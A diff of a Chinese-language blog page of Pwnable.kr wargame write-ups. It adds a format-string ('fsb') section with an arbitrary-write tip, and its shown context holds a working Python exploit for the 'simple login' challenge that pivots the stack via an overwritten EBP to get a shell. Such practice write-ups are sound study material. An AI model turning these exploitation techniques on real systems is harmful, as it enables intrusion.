@@ -114,7 +114,7 @@ exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
 利用.触发
 
 exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
-<meta property="og:updated_time" content="2016-07-25T12:33:24.000Z">
+<meta property="og:updated_time" content="2016-07-26T10:15:35.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Pwnable.kr [Rookiss] writeups">
 <meta name="twitter:description" content="bf
@@ -398,6 +398,11 @@ exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
 <h2 id="思路">思路</h2><p>解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的<code>EBP</code>，这样就可以通过控制<code>EBP</code>的值来转移<code>ESP</code>到数据段上的payload处，之后的<code>ret</code>指令会跳转到payload上的地址，即我们已经构造好的<code>correct</code>函数的地址，从而拿到shell</p>
 <p>## </p>
 <h2 id="exp">exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'AAAA'</span></span><br><span class="line">payload +=  l32(<span class="number">0x08049284</span>)</span><br><span class="line">payload +=  l32(<span class="number">0x0811eb40</span>)  </span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Authenticate :'</span>)</span><br><span class="line">io.writeline(b64encode(payload))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h1 id="fsb">fsb</h1><h2 id="trick-1">trick</h2><ul>
+<li>利用fsb的<code>%_$n</code>时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用<code>%_$n</code>写入，这样相当于在栈上实现<code>arbitrary write</code>，之后就按正常的套路即可</li>
+</ul>
+<h2 id="exp-1">exp</h2><p>没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段。</p>
+<p>等过段时间回来再写一次exp</p>
 
       
     </div>
@@ -554,7 +559,7 @@ exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bf"><span class="nav-number">1.</span> <span class="nav-text">bf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路:"><span class="nav-number">1.1.</span> <span class="nav-text">利用思路:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp:"><span class="nav-number">1.2.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#simple_login"><span class="nav-number">2.</span> <span class="nav-text">simple login</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#trick"><span class="nav-number">2.1.</span> <span class="nav-text">trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bf"><span class="nav-number">1.</span> <span class="nav-text">bf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用思路:"><span class="nav-number">1.1.</span> <span class="nav-text">利用思路:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp:"><span class="nav-number">1.2.</span> <span class="nav-text">exp:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#simple_login"><span class="nav-number">2.</span> <span class="nav-text">simple login</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#trick"><span class="nav-number">2.1.</span> <span class="nav-text">trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fsb"><span class="nav-number">3.</span> <span class="nav-text">fsb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#trick-1"><span class="nav-number">3.1.</span> <span class="nav-text">trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">3.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
             
           </div>
         </section>
